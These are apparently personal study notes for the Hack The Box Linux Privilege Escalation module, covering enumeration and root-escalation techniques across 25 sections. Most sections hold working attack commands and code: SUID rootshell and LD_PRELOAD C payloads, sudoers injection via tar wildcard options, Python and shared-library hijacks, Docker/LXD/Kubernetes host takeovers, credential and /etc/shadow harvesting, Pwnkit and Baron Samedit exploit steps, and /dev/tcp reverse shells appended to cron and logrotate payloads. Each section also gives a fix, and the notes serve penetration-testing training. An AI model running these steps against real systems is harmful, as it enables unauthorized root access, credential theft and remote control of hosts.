Linux Privilege Escalation — Complete Module Notes

> A practical, beginner-friendly reference for everything covered in the HTB Linux Privilege Escalation module.

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Environment Enumeration](#2-environment-enumeration)
3. [Services & Internals Enumeration](#3-services--internals-enumeration)
4. [Credential Hunting](#4-credential-hunting)
5. [Path Abuse](#5-path-abuse)
6. [Wildcard Abuse](#6-wildcard-abuse)
7. [Escaping Restricted Shells](#7-escaping-restricted-shells)
8. [Special Permissions (SUID/SGID)](#8-special-permissions-suid-sgid)
9. [Sudo Rights Abuse](#9-sudo-rights-abuse)
10. [Privileged Groups](#10-privileged-groups)
11. [Linux Capabilities](#11-linux-capabilities)
12. [Vulnerable Services — Screen](#12-vulnerable-services--screen)
13. [Cron Job Abuse](#13-cron-job-abuse)
14. [Containers — LXC/LXD](#14-containers--lxclxd)
15. [Docker](#15-docker)
16. [Kubernetes](#16-kubernetes)
17. [Logrotate](#17-logrotate)
18. [Miscellaneous Techniques](#18-miscellaneous-techniques)
19. [Kernel Exploits](#19-kernel-exploits)
20. [Shared Libraries & LD_PRELOAD](#20-shared-libraries--ld_preload)
21. [Shared Object Hijacking](#21-shared-object-hijacking)
22. [Python Library Hijacking](#22-python-library-hijacking)
23. [Sudo Vulnerabilities (CVEs)](#23-sudo-vulnerabilities-cves)
24. [Polkit / Pwnkit (CVE-2021-4034)](#24-polkit--pwnkit-cve-2021-4034)
25. [Quick Reference Cheat Sheet](#25-quick-reference-cheat-sheet)

---

## 1. Introduction

**Goal:** Gain root access on a Linux host after landing a low-privileged shell.

**Why root matters:**
- Read sensitive files (/etc/shadow, SSH keys, configs)
- Capture traffic
- Pivot to other systems
- If domain-joined, dump NTLM hashes and attack AD

**Key principle:** Enumeration is everything. Find misconfigurations, weak permissions, credentials, and vulnerable software.

---

## 2. Environment Enumeration

Start with orientation commands:

whoami
id
hostname
ifconfig || ip a
sudo -l

What to check

Area | Command | Look for
OS version | cat /etc/os-release | Distro + version (EOL?)
Kernel | uname -a | Public exploits
PATH | echo $PATH | Writable dirs, . in path
Env vars | env | Secrets, tokens
Drives | lsblk, df -h | Unmounted filesystems
Defenses | iptables -L, getenforce | Firewall, SELinux, AppArmor
Network | route, arp -a, cat /etc/resolv.conf | Other subnets, AD
Users | cat /etc/passwd, cat /etc/group | Login shells, sudo group
Home dirs | ls -la /home/* | SSH keys, .bash_history, configs
Hidden files | find / -type f -name ".*" | .notes, .viminfo, secrets
Temp dirs | ls -la /tmp /var/tmp /dev/shm | Scripts, logs, output

Key insight: Always note down credentials found and try them everywhere. Password reuse is common.

---

## 3. Services & Internals Enumeration

Go deeper into the OS:

# Network
ip a
cat /etc/hosts

# Login history
lastlog
w

# Command history
history
find / -type f \( -name "*_hist" -o -name "*_history" \) 2>/dev/null

# Cron
ls -la /etc/cron.*
crontab -l
cat /etc/crontab

# Running processes
ps aux | grep root
find /proc -name cmdline -exec cat {} \; 2>/dev/null

# Installed packages
apt list --installed
sudo -V                    # Check sudo version

# Binaries
ls -l /bin /usr/bin /usr/sbin

# Config files
find / -type f \( -name "*.conf" -o -name "*.config" \) 2>/dev/null

# Scripts
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

GTFOBins check:

for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do
  grep -q "$i" installed_pkgs.list && echo "Check GTFO: $i"
done

---

## 4. Credential Hunting

Search the system for credentials, keys, and secrets.

Common locations

Location | What to look for
/var/www/html | WordPress wp-config.php, .env
/var/spool/mail, /var/mail | Emails with credentials
/etc | Config files
Home directories | .bash_history, .viminfo, .ssh/
Backups | .bak, .old, .zip, .tar.gz
Databases | .db, .sql, .sqlite
Web configs | config.php, settings.py, database.yml

Search commands

# Config files
find / -type f \( -iname "*config*" -o -iname "*.conf" \) 2>/dev/null

# Grep for credentials
grep -Ri "password\|passwd\|secret\|key\|token" /home /var/www /etc /opt 2>/dev/null

# SSH keys
find / -type f \( -name "id_rsa" -o -name "id_ed25519" \) 2>/dev/null

# Bash history
grep -i "pass\|ssh\|mysql\|sudo" ~/.bash_history 2>/dev/null

Also check: ~/.ssh/known_hosts for other hosts to pivot to.

---

## 5. Path Abuse

What it is: Hijacking commands by manipulating the PATH environment variable.

Two scenarios:
- A writable directory appears in PATH
- . (current directory) is in PATH

Exploit

# Add current dir to PATH
PATH=.:$PATH
export PATH

# Create malicious script named after a common command
echo 'echo "HIJACKED"' > ls
chmod +x ls

# When root runs 'ls', your script executes instead
ls

Detection

echo $PATH
for d in $(echo $PATH | tr ':' ' '); do [ -w "$d" ] && echo "WRITABLE: $d"; done

Fix: Never use relative paths in root scripts; use absolute paths (/bin/ls).

---

## 6. Wildcard Abuse

What it is: Abusing shell wildcards (*) to inject command-line options into root-run commands.

Classic target: tar with --checkpoint-action.

Exploit (tar)

# In a directory where root runs: tar -zcf backup.tar.gz *
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

# Wait for cron job to run → sudo -l shows NOPASSWD: ALL
sudo su

Detection

cat /etc/crontab
ls -la /etc/cron.*

Fix: Use -- before wildcards: tar -zcf backup.tar.gz -- *

---

## 7. Escaping Restricted Shells

Restricted shells: rbash, rksh, rzsh

Common escape techniques

Method | Example
Command substitution | ls -l $(pwd)
Backticks | ls -l `pwd`
Command chaining | ls; pwd
Environment variables | export PATH=/bin:/usr/bin
Shell functions | function ls() { /bin/bash; }; ls
Editor escape | vi → :!/bin/sh
awk | awk 'BEGIN {system("/bin/bash")}'
less/more | !sh
SSH bypass | ssh user@host -t "bash --noprofile"

---

## 8. Special Permissions (SUID/SGID)

SUID: Binary runs with owner's privileges (often root).
SGID: Binary runs with group's privileges.

Detection

# SUID
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# SGID
find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null

# Both
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

Exploitation

Check any SUID binary on GTFOBins.

Example: SUID bash

/bin/bash -p   # -p preserves privileges

Example: SUID find

find . -exec /bin/sh \; -quit

Example: SUID vim

vim -c ':!/bin/sh'

---

## 9. Sudo Rights Abuse

Check your rights:

sudo -l

Look for:
- NOPASSWD — no password required
- SETENV — environment variables allowed
- env_keep+=LD_PRELOAD — library hijacking possible
- (ALL, !root) — CVE-2019-14287
- Wildcards in allowed commands

GTFOBins examples

Binary | Escape
vim | :!sh
less/more | !sh
find | find . -exec /bin/sh \;
awk | awk 'BEGIN {system("/bin/sh")}'
python | python -c 'import os; os.system("/bin/sh")'
perl | perl -e 'exec "/bin/sh";'
tar | --checkpoint-action=exec=sh
apt-get | -o APT::Update::Pre-Invoke::=/bin/sh
env | env /bin/sh
nmap | --interactive → !sh
cp | Overwrite /etc/passwd
tcpdump | -z /tmp/script
ncdu | Press b for shell

---

## 10. Privileged Groups

Membership in these groups = easy root:

Group | Exploit
lxd / lxc | Create privileged container, mount host /
docker | Run container mounting host /, chroot in
disk | Raw disk access via debugfs or mount
adm | Read /var/log for credentials
sudo | Full sudo (see sudo section)
video | Screen/keyboard access
shadow | Read /etc/shadow

Check membership

id

---

## 11. Linux Capabilities

What it is: Granular root privileges attached to binaries.

Dangerous capabilities

Capability | Impact
cap_setuid | Change to root
cap_setgid | Change to root group
cap_sys_admin | Broad admin (mount, etc.)
cap_dac_override | Bypass file permission checks
cap_sys_ptrace | Debug/inject into processes
cap_sys_module | Load kernel modules

Detection

getcap -r / 2>/dev/null

Exploit (cap_dac_override on vim)

vim.basic /etc/passwd
# Remove 'x' from root line: root::0:0:root:/root:/bin/bash
su root

Exploit (cap_setuid on python)

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Fix: Audit capabilities regularly with getcap -r /.

---

## 12. Vulnerable Services — Screen

Vulnerability: Screen 4.5.0 setuid root allows ld.so.preload overwriting.

Detection

screen -v
# Screen version 4.05.00 (GNU) 10-Dec-16
ls -la $(which screen)
# -rwsr-xr-x 1 root root ... screen

Exploit (logrotten-style)

# Create malicious library
cat > /tmp/libhax.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c

# Create SUID rootshell
cat > /tmp/rootshell.c << 'EOF'
#include <stdio.h>
int main(void){
    setuid(0); setgid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c

# Overwrite /etc/ld.so.preload via screen
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell

Fix: Update screen or remove SUID bit.

---

## 13. Cron Job Abuse

What it is: Exploiting writable scripts run by root's cron jobs.

Detection

# Find world-writable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Check cron dirs
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.d/
cat /etc/crontab
crontab -l

Monitor with pspy

./pspy64 -pf -i 1000

Shows commands run by other users and cron jobs in real time.

Exploit

# Back up original
cp /dmz-backups/backup.sh /tmp/backup.sh.bak

# Append reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.24/443 0>&1' >> /dmz-backups/backup.sh

# Or append SUID bash payload
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /dmz-backups/backup.sh

# Wait for cron to run
/tmp/bash -p

Fix: Restrict script permissions, use absolute paths, avoid wildcards.

---

## 14. Containers — LXC/LXD

Requirement: User must be in lxd or lxc group.

Check

id
# Look for lxd or lxc in groups

Exploit

# Import image
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list

# Create privileged container
lxc init ubuntutemp privesc -c security.privileged=true

# Mount host root
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Start and enter
lxc start privesc
lxc exec privesc /bin/bash

# Read host files as root
cat /mnt/root/root/flag.txt
cat /mnt/root/etc/shadow

Fix: Remove users from lxd group; use unprivileged containers only.

---

## 15. Docker

Requirement: User in docker group, or writable /var/run/docker.sock, or SUID docker.

Check

id
# Look for docker in groups

ls -la /var/run/docker.sock
find / -name "docker.sock" 2>/dev/null

Exploit (docker group)

docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# You are now root on the host
cat /root/flag.txt

Exploit (writable socket)

docker -H unix:///path/to/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

Fast flag read

docker run -v /root:/mnt --rm -it ubuntu cat /mnt/flag.txt

Fix: Restrict docker group membership; protect the socket.

---

## 16. Kubernetes

Key components:
- Kubelet API — port 10250 (RCE), 10255 (read-only)
- API Server — port 6443
- Service account token — /var/run/secrets/kubernetes.io/serviceaccount/token

Attack path

Enumerate Kubelet (anonymous access):

curl https://10.129.10.11:10250/pods -k | jq .
kubeletctl -i --server 10.129.10.11 pods
kubeletctl -i --server 10.129.10.11 scan rce

Execute commands in pod:

kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
# uid=0(root)

Extract service account token + cert:

kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee k8.token
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt

Check permissions:

export token=$(cat k8.token)
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Create privileged pod mounting host /:

apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 apply -f privesc.yaml
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

Fix: Disable anonymous Kubelet access, enforce RBAC, avoid hostPath mounts.

---

## 17. Logrotate

Vulnerable versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0

Requirements:
- Write access to a log file
- Logrotate runs as root
- Race condition between file rename and recreate

Exploit (logrotten)

git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

# Create payload
echo 'bash -i >& /dev/tcp/10.10.14.24/9001 0>&1' > payload

# Check if config uses 'create' or 'compress'
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# Run (adjust path to writable log)
./logrotten -p ./payload /home/htb-student/mon/mon.log

# Listener on Kali
nc -lnvp 9001

Note: Race condition — may need multiple attempts.

Fix: Update logrotate; restrict log file permissions.

---

## 18. Miscellaneous Techniques

Passive Traffic Capture

If tcpdump is accessible:

tcpdump -i any -w capture.pcap
# Analyze with Wireshark, net-creds, or PCredz

Look for cleartext credentials (HTTP, FTP, telnet) and NTLM/Kerberos hashes.

Weak NFS Privileges

Enumerate exports:

showmount -e 10.129.2.12

Check /etc/exports for no_root_squash:

cat /etc/exports

Exploit (if no_root_squash):

# On Kali (as root)
cat > shell.c << 'EOF'
#include <stdio.h>
int main(void){ setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell

# On target
/tmp/shell
id

Fix: Never use no_root_squash; use root_squash.

Hijacking Tmux Sessions

Detection:

ps aux | grep tmux
find / -type s -name "*.sock" 2>/dev/null
ls -la /shareds

Exploit:

# If you are in the socket's group (e.g., devs)
tmux -S /shareds
id
# uid=0(root)

Fix: Don't leave root tmux sessions; strict socket permissions.

---

## 19. Kernel Exploits

Check version:

uname -a
cat /etc/lsb-release

Famous CVEs:

CVE | Name | Affected
CVE-2016-5195 | Dirty COW | 2.6.22 – 4.8.3
CVE-2021-3493 | OverlayFS | Ubuntu 16.04 (kernels < 4.4.0-209)
CVE-2021-33909 | Sequoia | Kernel 3.16 – 5.13.4
CVE-2021-22555 | Netfilter | Kernel < 5.12
CVE-2017-16995 | eBPF | Ubuntu 16.04 (4.4.0-116)

General process:
1. Identify kernel version
2. Search for PoC (Google, exploit-db, GitHub)
3. Transfer to target
4. Compile: gcc exploit.c -o exploit
5. Run: ./exploit

Warning: Kernel exploits can crash the system. Use caution.

Fix: Patch kernel; disable unprivileged eBPF where applicable.

---

## 20. Shared Libraries & LD_PRELOAD

What it is: Load a malicious shared library before a target binary.

Requirement: Sudo rule with env_keep+=LD_PRELOAD.

Detection

sudo -l
# Look for env_keep+=LD_PRELOAD

ldd /path/to/binary   # Inspect library dependencies

Exploit

// root.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles

# Trigger via sudo-allowed command
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

Fix: Remove env_keep+=LD_PRELOAD; use env_reset.

---

## 21. Shared Object Hijacking

What it is: Replace a library loaded by a SUID binary from a writable directory.

Detection

ldd payroll
# libshared.so => /development/libshared.so

readelf -d payroll | grep PATH
# RUNPATH: [/development]

ls -la /development/
# drwxrwxrwx ... /development/

Exploit

Find the missing function symbol:

cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll
# symbol lookup error: undefined symbol: dbquery

Create malicious library:

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/bash -p");
}

Compile into writable dir:

gcc src.c -fPIC -shared -o /development/libshared.so
./payroll
id   # uid=0(root)

Fix: Remove write perms from RUNPATH directories; audit SUID binaries.

---

## 22. Python Library Hijacking

Three vectors:

Vector 1: Insecure Write Permissions

If a Python module is writable by your user:

ls -la /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-rw-rw- → writable

Inject code at the top of a function:

def virtual_memory():
    import os
    os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
    # original code below...

Trigger:

sudo /usr/bin/python3 /home/htb-student/mem_status.py
/tmp/bash -p

Vector 2: Library Search Path

If a higher-priority sys.path directory is writable:

python3 -c 'import sys; print("\n".join(sys.path))'

Plant a malicious module:

cat > /usr/lib/python3.8/psutil.py << 'EOF'
import os
def virtual_memory():
    os.system('cp /bin/bash /tmp/bash; chmod +s /tmp/bash')
EOF

sudo /usr/bin/python3 mem_status.py
/tmp/bash -p

Vector 3: PYTHONPATH Environment Variable

If sudo allows SETENV:

sudo -l | grep SETENV

Place malicious module in /tmp:

cat > /tmp/psutil.py << 'EOF'
import os
def virtual_memory():
    os.system('cp /bin/bash /tmp/bash; chmod +s /tmp/bash')
EOF

sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
/tmp/bash -p

Fix: Restrict sudo Python, lock module permissions, avoid SETENV.

---

## 23. Sudo Vulnerabilities (CVEs)

CVE-2021-3156 (Baron Samedit)

Affected: sudo 1.8.2–1.8.31p2, 1.9.0–1.9.5p1

Check:

sudo -V | head -n1
sudoedit -s /
# If error: "sudoedit: /: not a regular file" → vulnerable

Exploit:

git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich   # Lists targets
./sudo-hax-me-a-sandwich 1 # Select target number

CVE-2019-14287 (Sudo Policy Bypass)

Affected: sudo < 1.8.28

Prerequisite: Sudo rule with (ALL, !root)

Check:

sudo -l
# (ALL, !root) /bin/bash  ← exploitable

Exploit:

sudo -u#-1 /bin/bash
# uid=0(root)

Or with ncdu:

sudo -u#-1 /bin/ncdu
# Press 'b' for shell

Fix: Update sudo; remove !root rules.

---

## 24. Polkit / Pwnkit (CVE-2021-4034)

What it is: Memory corruption in pkexec → local root.

Check:

which pkexec
ls -la /usr/bin/pkexec
# -rwsr-xr-x 1 root root ... /usr/bin/pkexec
pkexec --version
# pkexec version 0.105  ← vulnerable

Exploit:

# On Kali (compile)
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc

# Serve over HTTP
python3 -m http.server 80

# On target (download SOURCE, compile locally to avoid GLIBC issues)
cd /tmp
wget http://<KALI_IP>/cve-2021-4034-poc.c -O poc.c
gcc poc.c -o poc
chmod +x poc
./poc
id   # uid=0(root)
cat /root/flag.txt

If gcc is not on the target:

# On Kali
gcc -static cve-2021-4034-poc.c -o poc-static
# Transfer, chmod, run

Fix: Patch polkit; remove SUID from pkexec if unused.

---

## 25. Quick Reference Cheat Sheet

Enumeration

id; whoami; hostname; uname -a
sudo -l
cat /etc/os-release
echo $PATH
ps aux | grep root
find / -perm -4000 -type f 2>/dev/null   # SUID
getcap -r / 2>/dev/null                  # Capabilities
find / -writable -type d 2>/dev/null     # Writable dirs

Common Exploits

# SUID bash
/bin/bash -p

# Sudo GTFOBins
sudo <binary> <escape-args>

# Sudo !root bypass
sudo -u#-1 /bin/bash

# Docker
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# LXD
lxc init img privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc && lxc exec privesc /bin/bash

# Capabilities
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Cron
echo 'payload' >> /writable/script.sh

# Pwnkit
./poc

Reverse Shell One-Liners

bash -i >& /dev/tcp/10.10.14.24/443 0>&1

Listener

nc -lnvp 443

---

## Final Notes

- Enumeration is 90% of the work. Be thorough.
- Always try the easy wins first: sudo -l, SUID binaries, cron jobs.
- Look for custom/non-standard files and paths — those are where misconfigurations hide.
- Check GTFOBins for any binary you find with SUID or sudo rights.
- Document everything — you may need to retrace your steps.

Happy hacking!
